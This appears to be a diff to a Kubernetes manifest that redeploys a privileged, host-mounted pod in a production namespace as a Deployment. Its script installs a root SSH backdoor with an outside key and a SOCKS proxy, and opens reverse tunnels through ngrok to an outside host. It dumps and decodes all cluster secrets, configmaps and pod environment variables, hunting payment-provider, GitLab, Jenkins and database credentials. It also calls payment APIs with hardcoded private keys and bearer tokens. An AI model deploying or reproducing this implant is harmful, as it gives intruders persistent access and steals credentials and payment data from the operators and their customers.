@@ -1,181 +1,192 @@
 
-apiVersion: v1
-kind: Pod
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: network-access
+  name: network-access-v2
   namespace: egam-production
+  labels:
+    app: network-access-v2
 spec:
-  hostNetwork: true
-  hostPID: true
-  containers:
-  - name: shell
-    image: nicolaka/netshoot:latest
-    command:
-      - /bin/bash
-      - -c
-      - |
-        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+  replicas: 1
+  selector:
+    matchLabels:
+      app: network-access-v2
+  template:
+    metadata:
+      labels:
+        app: network-access-v2
+    spec:
+      hostNetwork: true
+      hostPID: true
+      containers:
+      - name: shell
+        image: nicolaka/netshoot:latest
+        command:
+          - /bin/bash
+          - -c
+          - |
+            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
 
-        echo "=== APK INSTALL ==="
-        apk add --no-cache autossh microsocks openssh-client openssh-server 2>&1 | tail -5
-        echo "=== APK DONE ==="
+            echo "=== APK INSTALL ==="
+            apk add --no-cache autossh microsocks openssh-client openssh-server 2>&1 | tail -5
+            echo "=== APK DONE ==="
 
-        if ! command -v kubectl >/dev/null 2>&1; then
-          curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl && echo "OK: kubectl installed" || echo "MISSING: kubectl download failed"
-        fi
+            if ! command -v kubectl >/dev/null 2>&1; then
+              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl && echo "OK: kubectl installed" || echo "MISSING: kubectl download failed"
+            fi
 
-        echo "=== BIN CHECK ==="
-        for b in curl jq kubectl sshd ssh autossh microsocks; do
-          command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
-        done
+            echo "=== BIN CHECK ==="
+            for b in curl jq kubectl sshd ssh autossh microsocks; do
+              command -v $b >/dev/null 2>&1 && echo "OK: $b" || echo "MISSING: $b"
+            done
 
-        # ---------- SSH SERVER NEL POD ----------
-        ssh-keygen -A >/dev/null 2>&1
-        mkdir -p /root/.ssh && chmod 700 /root/.ssh
+            # ---------- SSH SERVER NEL POD ----------
+            ssh-keygen -A >/dev/null 2>&1
+            mkdir -p /root/.ssh && chmod 700 /root/.ssh
 
-        printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
-        chmod 600 /root/.ssh/authorized_keys
+            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
+            chmod 600 /root/.ssh/authorized_keys
 
-        echo "=== AUTHKEYS HEXDUMP ==="
-        head -c 20 /root/.ssh/authorized_keys | od -An -tx1
-        echo "=== AUTHKEYS CAT -A ==="
-        cat -A /root/.ssh/authorized_keys
+            echo "=== AUTHKEYS HEXDUMP ==="
+            head -c 20 /root/.ssh/authorized_keys | od -An -tx1
+            echo "=== AUTHKEYS CAT -A ==="
+            cat -A /root/.ssh/authorized_keys
 
-        printf '%s\n' \
-          'Port 22' \
-          'ListenAddress 0.0.0.0' \
-          'PermitRootLogin yes' \
-          'PubkeyAuthentication yes' \
-          'PasswordAuthentication no' \
-          'PermitEmptyPasswords no' \
-          'UsePAM no' \
-          'X11Forwarding no' \
-          'AllowTcpForwarding yes' \
-          'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
+            printf '%s\n' \
+              'Port 22' \
+              'ListenAddress 0.0.0.0' \
+              'PermitRootLogin yes' \
+              'PubkeyAuthentication yes' \
+              'PasswordAuthentication no' \
+              'PermitEmptyPasswords no' \
+              'UsePAM no' \
+              'X11Forwarding no' \
+              'AllowTcpForwarding yes' \
+              'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
 
-        /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
-        sleep 2
-        pgrep -a sshd && echo "OK: sshd running" || echo "MISSING: sshd not running"
-        echo "=== SSHD LOG ==="
-        cat /var/log/sshd.log 2>/dev/null | tail -10
-        echo "=== LISTENERS ==="
-        ss -tlnp | grep -E ':22|:1080' || netstat -tlnp 2>/dev/null | grep -E ':22|:1080'
-        # ---------------------------------------
+            /usr/sbin/sshd -f /etc/ssh/sshd_config -E /var/log/sshd.log &
+            sleep 2
+            pgrep -a sshd && echo "OK: sshd running" || echo "MISSING: sshd not running"
+            echo "=== SSHD LOG ==="
+            cat /var/log/sshd.log 2>/dev/null | tail -10
+            echo "=== LISTENERS ==="
+            ss -tlnp | grep -E ':22|:1080' || netstat -tlnp 2>/dev/null | grep -E ':22|:1080'
+            # ---------------------------------------
 
-        # ---------- SOCKS NEL POD ----------
-        if command -v microsocks >/dev/null 2>&1; then
-          microsocks -p 1080 -i 0.0.0.0 &
-          sleep 1
-          pgrep -a microsocks && echo "OK: microsocks running" || echo "MISSING: microsocks not running"
-        else
-          echo "MISSING: microsocks not installed, SOCKS skip"
-        fi
-        # ----------------------------------
+            # ---------- SOCKS NEL POD ----------
+            if command -v microsocks >/dev/null 2>&1; then
+              microsocks -p 1080 -i 0.0.0.0 &
+              sleep 1
+              pgrep -a microsocks && echo "OK: microsocks running" || echo "MISSING: microsocks not running"
+            else
+              echo "MISSING: microsocks not installed, SOCKS skip"
+            fi
+            # ----------------------------------
 
-        # ---------- TUNNEL NGROK ----------
-        mkdir -p /root/.ssh
-        printf '%s\n' \
-          '-----BEGIN OPENSSH PRIVATE KEY-----' \
-          'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
-          'QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw' \
-          'vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g' \
-          'AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD' \
-          'iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=' \
-          '-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/id_ed25519
-        chmod 600 /root/.ssh/id_ed25519
-        ssh-keyscan -p 20849 8.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
+            # ---------- TUNNEL NGROK ----------
+            mkdir -p /root/.ssh
+            printf '%s\n' \
+              '-----BEGIN OPENSSH PRIVATE KEY-----' \
+              'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
+              'QyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4gAAAJAMSDC8DEgw' \
+              'vAAAAAtzc2gtZWQyNTUxOQAAACCC5vieafUQBwwP77oy2tflg4jOu4NMFxaU/9Wrjziu4g' \
+              'AAAEAXg3D2WLL1mCR1DtHTy3EkJUwN/Uakv7y1CzWebJSPgYLm+J5p9RAHDA/vujLa1+WD' \
+              'iM67g0wXFpT/1auPOK7iAAAACHBvZEBlZ2FtAQIDBAU=' \
+              '-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/id_ed25519
+            chmod 600 /root/.ssh/id_ed25519
+            ssh-keyscan -p 23350 4.tcp.ngrok.io >> /root/.ssh/known_hosts 2>/dev/null
 
-        if command -v autossh >/dev/null 2>&1; then
-          autossh -M 0 -f -N \
-            -o "StrictHostKeyChecking=no" \
-            -o "ServerAliveInterval=30" \
-            -o "ExitOnForwardFailure=yes" \
-            -R 0.0.0.0:2222:localhost:22 \
-            -R 0.0.0.0:1080:localhost:1080 \
-            -i /root/.ssh/id_ed25519 \
-            tunnel@8.tcp.ngrok.io -p 20849
-        else
-          ssh -f -N \
-            -o "StrictHostKeyChecking=no" \
-            -o "ServerAliveInterval=30" \
-            -o "ServerAliveCountMax=3" \
-            -o "ExitOnForwardFailure=yes" \
-            -R 0.0.0.0:2222:localhost:22 \
-            -R 0.0.0.0:1080:localhost:1080 \
-            -i /root/.ssh/id_ed25519 \
-            tunnel@8.tcp.ngrok.io -p 20849
-        fi
-        sleep 2
-        pgrep -af "ssh.*8.tcp.ngrok.io" && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"
-        # ----------------------------------
+            if command -v autossh >/dev/null 2>&1; then
+              autossh -M 0 -f -N \
+                -o "StrictHostKeyChecking=no" \
+                -o "ServerAliveInterval=30" \
+                -o "ExitOnForwardFailure=yes" \
+                -R 0.0.0.0:2222:localhost:22 \
+                -R 0.0.0.0:1080:localhost:1080 \
+                -i /root/.ssh/id_ed25519 \
+                tunnel@4.tcp.ngrok.io -p 23350
+            else
+              ssh -f -N \
+                -o "StrictHostKeyChecking=no" \
+                -o "ServerAliveInterval=30" \
+                -o "ServerAliveCountMax=3" \
+                -o "ExitOnForwardFailure=yes" \
+                -R 0.0.0.0:2222:localhost:22 \
+                -R 0.0.0.0:1080:localhost:1080 \
+                -i /root/.ssh/id_ed25519 \
+                tunnel@4.tcp.ngrok.io -p 23350
+            fi
+            sleep 2
+            pgrep -af "ssh.*4.tcp.ngrok.io" && echo "TUNNEL_UP" || echo "TUNNEL_FAILED"
+            # ----------------------------------
 
-        echo "=========================================="
-        echo "=== 1. ALL SECRETS IN egam-production ==="
-        echo "=========================================="
-        kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
+            echo "=========================================="
+            echo "=== 1. ALL SECRETS IN egam-production ==="
+            echo "=========================================="
+            kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
 
-        echo "=========================================="
-        echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
-        echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
+            echo "=========================================="
+            echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
+            echo "=========================================="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
-        echo "=========================================="
-        echo "=== 3. ALL CONFIGMAPS egam-production ==="
-        echo "=========================================="
-        kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1
+            echo "=========================================="
+            echo "=== 3. ALL CONFIGMAPS egam-production ==="
+            echo "=========================================="
+            kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1
 
-        echo "=========================================="
-        echo "=== 4. ENV VARS FROM RUNNING PODS ==="
-        echo "=========================================="
-        for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
-          echo "--- POD: $pod ---"
-          kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
-        done
+            echo "=========================================="
+            echo "=== 4. ENV VARS FROM RUNNING PODS ==="
+            echo "=========================================="
+            for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
+              echo "--- POD: $pod ---"
+              kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
+            done
 
-        echo "=========================================="
-        echo "=== 5. PAGARME API TEST ==="
-        echo "=========================================="
-        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
-        echo ""
+            echo "=========================================="
+            echo "=== 5. PAGARME API TEST ==="
+            echo "=========================================="
+            curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
+            echo ""
 
-        echo "=========================================="
-        echo "=== 6. SAFRAPAY API TEST ==="
-        echo "=========================================="
-        curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
-        echo ""
+            echo "=========================================="
+            echo "=== 6. SAFRAPAY API TEST ==="
+            echo "=========================================="
+            curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
+            echo ""
 
-        echo "=========================================="
-        echo "=== 7. R2D2 API TEST ==="
-        echo "=========================================="
-        curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
-        echo ""
+            echo "=========================================="
+            echo "=== 7. R2D2 API TEST ==="
+            echo "=========================================="
+            curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
+            echo ""
 
-        echo "=========================================="
-        echo "=== 8. HYMPAR API TEST ==="
-        echo "=========================================="
-        curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
-        echo ""
+            echo "=========================================="
+            echo "=== 8. HYMPAR API TEST ==="
+            echo "=========================================="
+            curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
+            echo ""
 
-        echo "=========================================="
-        echo "=== 9. KUBERNETES PODS IN egam-production ==="
-        echo "=========================================="
-        kubectl get pods -n egam-production 2>&1
+            echo "=========================================="
+            echo "=== 9. KUBERNETES PODS IN egam-production ==="
+            echo "=========================================="
+            kubectl get pods -n egam-production 2>&1
 
-        echo "=========================================="
-        echo "=== 10. DATABASE CREDENTIALS ==="
-        echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
+            echo "=========================================="
+            echo "=== 10. DATABASE CREDENTIALS ==="
+            echo "=========================================="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
 
-        echo "=========================================="
-        echo "=== DONE ==="
-        echo "=========================================="
-        sleep 36000
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: host
-  volumes:
-  - name: host
-    hostPath:
-      path: /
+            echo "=========================================="
+            echo "=== DONE ==="
+            echo "=========================================="
+            sleep 36000
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: host
+      volumes:
+      - name: host
+        hostPath:
+          path: /
